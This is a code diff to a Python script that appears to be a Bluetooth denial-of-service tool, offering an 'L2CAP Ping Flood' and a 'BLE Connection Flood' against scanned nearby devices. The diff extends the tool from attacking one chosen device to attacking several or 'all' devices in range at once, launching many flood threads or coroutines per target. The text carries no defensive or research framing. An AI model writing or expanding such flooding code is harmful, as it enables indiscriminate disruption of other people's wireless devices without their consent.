@@ -87,31 +87,50 @@ async def main():
     for i, d in enumerate(devices):
         print(f"{i}: {d.address} - {d.name or 'Unknown'}")
 
-    idx = int(input("\nSelect target device number: "))
-    target_addr = devices[idx].address
+    print("\nEnter device numbers (space-separated), or 'all' for all devices:")
+    selection = input("Selection: ").strip().lower()
     
+    target_addresses = []
+    if selection == 'all':
+        target_addresses = [d.address for d in devices]
+    else:
+        try:
+            indices = [int(idx) for idx in selection.split()]
+            target_addresses = [devices[idx].address for idx in indices if 0 <= idx < len(devices)]
+            if not target_addresses:
+                print("No valid devices selected")
+                sys.exit(1)
+        except ValueError:
+            print("Invalid input")
+            sys.exit(1)
+
     print("\nSelect attack method:")
     print("1: L2CAP Ping Flood (for linux only/needs root/use when device is already playing music)")
     print("2: BLE Connection Flood (for all devices/needs root/use when device is idle)")
     method = int(input("Method: "))
 
-    print(f"\nStarting attack on {target_addr}...")
-    writeLog(f"Attack started on {target_addr}")
+    print(f"\nStarting attack on {', '.join(target_addresses)}...")
+    for addr in target_addresses:
+        writeLog(f"Attack started on {addr}")
 
     try:
         if method == 1:
             threads = []
-            for _ in range(threadsCount):
-                t = threading.Thread(target=l2ping_attack, args=(target_addr,))
-                t.daemon = True
-                t.start()
-                threads.append(t)
+            for addr in target_addresses:
+                for _ in range(threadsCount):
+                    t = threading.Thread(target=l2ping_attack, args=(addr,))
+                    t.daemon = True
+                    t.start()
+                    threads.append(t)
             
             # Keep main thread alive
             while True:
                 time.sleep(1)
         else:
-            await asyncio.gather(*[ble_flood_attack(target_addr) for _ in range(threadsCount)])
+            all_attacks = []
+            for addr in target_addresses:
+                all_attacks.extend([ble_flood_attack(addr) for _ in range(threadsCount)])
+            await asyncio.gather(*all_attacks)
 
     except KeyboardInterrupt:
         print("\nAttack stopped")
